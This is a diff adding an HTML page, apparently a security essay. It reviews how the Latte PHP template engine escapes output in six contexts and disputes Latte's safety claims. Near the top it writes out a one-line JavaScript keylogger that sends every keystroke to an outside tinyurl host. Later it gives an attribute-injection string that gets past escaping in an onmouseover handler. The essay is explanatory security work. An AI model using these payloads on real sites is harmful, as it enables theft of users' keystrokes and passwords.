@@ -1,0 +1,112 @@
+<meta charset="UTF-8">
+<link rel="stylesheet" href="src/style.css">
+<style>
+  xmp.latte:before { content: "Latte encoding"; }
+</style>
+
+<h1>XSS Protection in Latte</h1>
+<p>Hey, let's code a single line keylogger:
+
+<xmp>
+onkeydown=function(e)((x=new XMLHttpRequest()),x.open(`GET`,`https://tinyurl.com/8wa5w2o/?k=`+e.keyCode),x.send())
+</xmp>
+
+<p>If I managed to run this on victim's page, they would send on my server <tt>https://tinyurl.com/8wa5w2o</tt> every key they push. I will know everything they type, even if they delete it before sending. It is not affected by <tt>htmlspecialchars</tt> php function. The only thing I need for XSS takeover is to run it as a script on victim's page. To unleash this attack, I will try to fill in every form on the target domain and seek in which context is the data displayed publically.
+
+<p>Lets make the keylogger local. This way we don't have to deal with same-origin policy protection, but this is out of scope of template systems and we can test the breaches locally:
+
+<xmp>
+window.onkeydown=function(e){console.log(e.keyCode)}
+</xmp>
+
+<p>Let's further assume the attacker stored data X on the server. Let's see how Latte handles the data in various context and let's show what Latte does to protect:
+
+<h3>1: &lt;b>{$X}&lt;/b></h3>
+<xmp class="latte">
+return $s instanceof HtmlStringable || $s instanceof \Nette\Utils\IHtmlString
+  ? $s->__toString(true)
+  : htmlspecialchars((string) $s, ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
+</xmp>
+<p>The contents replaces angle brackets and ampersand with HTML entities. It is created as a text node, no new HTML elements with events are possible here. Don't trust it blindly: Safe unless the innerHTML is decoded and shown elsewhere in the web's scripts. Latte passes, but note the bad design in the hardcoded Nette dependency.
+
+<h3>2: &lt;b onmouseover={$X}>test&lt;/b></h3>
+<xmp class="latte">
+$double = $double && $s instanceof HtmlStringable ? false : $double;
+$s = (string) $s;
+if (strpos($s, '`') !== false && strpbrk($s, ' <>"\'') === false) {
+  $s .= ' '; // protection against innerHTML mXSS vulnerability nette/nette#1496
+}
+return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5 | ENT_SUBSTITUTE, 'UTF-8', $double);
+</xmp>
+<p>The contents replaces quotes, apostrophes and ampersand with HTML entities preventing to close the attribute, but this is not enough to stop XSS. Having a latte template like this:
+<xmp>
+<img id="myImage">
+{var $change = 'myImage.src='.$X}
+<b onmouseover={$change}>test</b>
+</xmp>
+it can be exploited with <tt>"0;window.onkeydown=function(e){console.log(e.keyCode)}"</tt> in the <tt>$X</tt>.
+<p>In this code, as soon as the victim hovers over the bold text, the keylogger is on. User's input can't be trusted in <tt>on...</tt> attributes. Latte does some extra effort here in <tt>href</tt>:
+<xmp class="latte">
+return preg_match('~^(?:(?:https?|ftp)://[^@]+(?:/.*)?|(?:mailto|tel|sms):.+|[/?#].*|[^:]+)$~Di', $s) ? $s : '';
+</xmp>
+<p>but fails in the use-case above.
+
+<h3>3: &lt;b {$X}>test&lt;/b></h3>
+<xmp class="latte">
+$s = (string) $s;
+return preg_match('#^[a-z0-9:-]+$#i', $s)
+  ? $s
+  : '"' . self::escapeHtmlAttr($s) . '"';
+</xmp>
+<p>This effectively allows only to set boolean HTML attributes. A bit too restrictive it may seem, but otherwise many threats would come to play. Latte passes, no objections here.
+
+<h3>4: &lt;!-- {$X} --></h3>
+<xmp class="latte">
+$s = (string) $s;
+if ($s && ($s[0] === '-' || $s[0] === '>' || $s[0] === '!')) {
+    $s = ' ' . $s;
+}
+$s = str_replace('--', '- - ', $s);
+if (substr($s, -1) === '-') {
+    $s .= ' ';
+}
+return $s;
+</xmp>
+<p>A space is inserted after each minus sign, preventing closing the comment. Some PHP coders love to parse comments to add some obscure functionality in their frameworks. Hopefully front-end developers have not fallen that low, so this should be safe. Latte passes, however to build HTML comments is completely useless and should not be needed.
+
+<h3>5: &lt;script>{$X}&lt;/script></h3>
+<xmp class="latte">
+if ($s instanceof HtmlStringable || $s instanceof \Nette\Utils\IHtmlString) {
+  $s = $s->__toString(true);
+}
+$json = json_encode($s, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+if ($error = json_last_error()) {
+  throw new Latte\RuntimeException(json_last_error_msg(), $error);
+}
+return str_replace([']]>', '<!', '</'], [']]\u003E', '\u003C!', '<\/'], $json);
+</xmp>
+<p>X is wrapped in quotes, backslash, quotes and brackets inside it are escaped. The value can be used only as JS string. If it is not used in <tt>eval</tt>, no untrusted javascript can be executed here. Latte passes.
+
+<h3>6: &lt;style> b{ background:{$X} }&lt;/style></h3>
+<xmp class="latte">
+// http://www.w3.org/TR/2006/WD-CSS21-20060411/syndata.html#q6
+return addcslashes((string) $s, "\x00..\x1F!\"#$%&'()*+,./:;<=>?@[\\]^`{|}~");
+</xmp>
+<p>The contents escapes many characters. No trickery like <tt>url(javascript:...)</tt> allowed here. Latte passes. This XSS attack vector is closed on all modern browsers anyway, though.
+
+<h2>Native protection functions</h2>
+<p>The basic arsenal for dealing with client-side attacks consist of:
+<ul>
+  <li><tt>htmlspecialchars</tt> replaces some of these five characters <tt>&lt; > ' " &</tt> with html entities (<tt>" => &amp;quot;</tt>). <tt>&lt;</tt> is needed in HTML contents, <tt>></tt> in XML, <tt>&</tt> if the contents is parsed, <tt>'</tt> and <tt>"</tt> in HTML attributes. Since ES6 this should include the grave accent sign <tt>`</tt>.
+  <li><tt>quotemeta</tt> escapes <tt>. \ + * ? [ ^ ] ( $ )</tt> (<tt>( => \(</tt>), preparing string to be used in RegEx pattern.
+  <li><tt>addslashes</tt> escapes <tt> ' " \ NULL</tt>, preparing string to be wrapped by quotes or apostrophes (like in SQL query)
+  <li><tt>urlencode</tt> encodes non-alphanumeric except <tt>- . _</tt> (<tt>" => %22</tt>), preparing string to be used in URL query parameter.
+  <li><tt>base64_encode</tt> encodes binary data into alphanumeric (and =) set for safe transport in text-based protocol with any charset.
+</ul>
+
+<h2>Conclusion</h2>
+<p>To safely display untrusted data without digging in details, use only case 1 - <tt>&lt;b>{X}&lt;/b></tt> - where <tt>X</tt> is encoded by <tt>htmlspecialchars</tt> and don't process further the output. If you wan't more, learn about <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS</a>: no template system can magically bring you security without the knowledge. And without TLS your web can never be secure, increasing number of web features are turned off by browsers if not under HTTPS. Browsers also closes many security holes themselves, albeit new ones appear from time to time. Template systems are no security universal hammer.
+
+<p>Latte <a href="https://latte.nette.org/en/safety-first">claims</a> <i>Latte doesn't need any manual work. All is done automatically, consistently and correctly. You don't have to worry about security holes.</i> This is probably the most naive advice the internet has ever witnessed: there are always worries about security holes and the first principle of security is to never trust such claims and demand proofs (also apply this on every teacher you meet). It is not even explained what means <i>correctly</i>, which is a security issue by itself: read the Latte file <tt>Runtime/Filters.php</tt> to know what and how is encoded. If you do, you can probably write it better for your use case. If you don't, your security is based on uncertain beliefs like the Latte claim above.
+
+<p>All in all, template systems do template and contents merging. They can help with escaping, but security is not their domain: you should protect the template input by specialized security tools. Good tools are specialized and their code is easily understood and modified, it is easily integrated with third party tools. Bad tools try to do magically everything, render themselves as blackboxes and are part of single-manufacturer ecosystems (Like Nette, Latte, DiBi), which is also vendor locking issue.
